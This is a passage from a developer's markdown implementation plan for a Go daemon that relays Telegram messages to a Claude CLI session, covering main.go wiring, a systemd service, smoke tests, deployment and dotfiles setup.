cd ~/infra/claude-channels && go build ./... && go vet ./...
```

- [ ] **Step 4: Commit**

```bash
git add internal/telegram/bot.go internal/telegram/handler.go
git commit -m "feat: telegram bot with message handling and streaming"
```

---

## Task 9: Main Entrypoint + Wire Everything

**Files:**
- Modify: `cmd/claude-channels/main.go`

- [ ] **Step 1: Wire all components in main.go**

```go
package main

import (
	"context"
	"flag"
	"log/slog"
	"os"
	"os/signal"
	"syscall"

	"github.com/scipio/claude-channels/internal/claude"
	"github.com/scipio/claude-channels/internal/config"
	"github.com/scipio/claude-channels/internal/notify"
	"github.com/scipio/claude-channels/internal/safety"
	"github.com/scipio/claude-channels/internal/session"
	"github.com/scipio/claude-channels/internal/telegram"
)

func main() {
	configPath := flag.String("config", "", "path to config.yaml")
	flag.Parse()

	logger := slog.New(slog.NewJSONHandler(os.Stderr, &slog.HandlerOptions{
		Level: slog.LevelInfo,
	}))
	slog.SetDefault(logger)

	cfg, err := config.Load(*configPath)
	if err != nil {
		slog.Error("failed to load config", "error", err)
		os.Exit(1)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	// Initialize components
	sessionMgr := session.NewManager(cfg.Storage.Dir)
	if err := sessionMgr.Load(); err != nil {
		slog.Warn("failed to load sessions, starting fresh", "error", err)
	}

	filter := safety.NewFilter(cfg.Safety)
	executor := claude.NewCLIExecutor(cfg.Claude)
	notifier := notify.New(cfg.Notify)

	bot, err := telegram.NewBot(cfg, sessionMgr, executor, filter, notifier)
	if err != nil {
		slog.Error("failed to create bot", "error", err)
		os.Exit(1)
	}

	notifier.Send("daemon_start", "Claude Channels started")
	slog.Info("starting claude-channels")

	if err := bot.Start(ctx); err != nil {
		slog.Error("bot stopped with error", "error", err)
		notifier.Send("daemon_crash", "Claude Channels crashed: "+err.Error())
		os.Exit(1)
	}

	sessionMgr.Save()
	notifier.Send("daemon_stop", "Claude Channels stopped")
}
```

- [ ] **Step 2: Full build and vet**

```bash
cd ~/infra/claude-channels && go build ./... && go vet ./...
```

- [ ] **Step 3: Full test suite**

```bash
cd ~/infra/claude-channels && go test -race ./...
```

- [ ] **Step 4: Commit**

```bash
git add cmd/ && git commit -m "feat: main entrypoint wiring all components"
```

---

## Task 10: systemd Service + config.example

**Files:**
- Create: `claude-channels.service`
- Modify: `config.example.yaml`

- [ ] **Step 1: Create systemd service file**

```ini
[Unit]
Description=Claude Channels Telegram Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=%h/go/bin/claude-channels --config %h/.config/claude-channels/config.yaml
WorkingDirectory=%h
Restart=on-failure
RestartSec=10
EnvironmentFile=%h/.config/claude-channels/env
NoNewPrivileges=true
ProtectSystem=strict
ReadWritePaths=%h
PrivateTmp=true
StandardOutput=journal
StandardError=journal
SyslogIdentifier=claude-channels

[Install]
WantedBy=default.target
```

- [ ] **Step 2: Create complete config.example.yaml**

With all fields documented and sensible defaults.

- [ ] **Step 3: Commit**

```bash
git add claude-channels.service config.example.yaml
git commit -m "feat: systemd service and example config"
```

---

## Task 11: Integration Test + Smoke Test

**Files:**
- Create: `test/smoke.sh`

- [ ] **Step 1: Write integration test**

Test full prompt flow with MockExecutor: message in → safety check → session create → executor call → response formatted.

- [ ] **Step 2: Create smoke test script**

```bash
#!/usr/bin/env bash
# test/smoke.sh — post-deploy verification
set -euo pipefail
# Sends /status via Telegram API, waits for response, verifies
```

- [ ] **Step 3: Full test suite with coverage**

```bash
cd ~/infra/claude-channels && go test -race -cover ./...
```

Target: overall 80%+

- [ ] **Step 4: Commit**

```bash
git add test/ && git commit -m "test: integration and smoke tests"
```

---

## Task 12: Deploy + Verify

- [ ] **Step 1: Build binary**

```bash
cd ~/infra/claude-channels && make build
```

- [ ] **Step 2: Setup config**

```bash
mkdir -p ~/.config/claude-channels
cp config.example.yaml ~/.config/claude-channels/config.yaml
# Edit config.yaml with real Telegram user ID
# Create env file with secrets
```

- [ ] **Step 3: Install and start service**

```bash
make install
```

- [ ] **Step 4: Verify via journalctl**

```bash
make logs
```

- [ ] **Step 5: Run smoke test from Telegram**

Send `/status` from Telegram, verify response.

- [ ] **Step 6: Test core flows**

- Send text prompt → verify Claude responds
- `/new ~/infra` → verify session created
- `/shell git status` → verify direct shell output
- `/clear` → verify session reset but workdir preserved
- Send blocked command → verify safety filter blocks

- [ ] **Step 7: Commit any fixes**

---

## Task 13: Dotfiles Integration

- [ ] **Step 1: Create dotfiles symlink structure**

```bash
mkdir -p ~/dotfiles/claude-channels.symlink
cp config.example.yaml ~/dotfiles/claude-channels.symlink/config.yaml
cp claude-channels.service ~/dotfiles/claude-channels.symlink/
cp config.example.yaml ~/dotfiles/claude-channels.symlink/env.example
```

- [ ] **Step 2: Create symlinks**

```bash
ln -sf ~/dotfiles/claude-channels.symlink/config.yaml ~/.config/claude-channels/config.yaml
ln -sf ~/dotfiles/claude-channels.symlink/claude-channels.service ~/.config/systemd/user/claude-channels.service
systemctl --user daemon-reload
```

- [ ] **Step 3: Verify service still works**

```bash
make restart && make status
```

- [ ] **Step 4: Commit dotfiles changes**
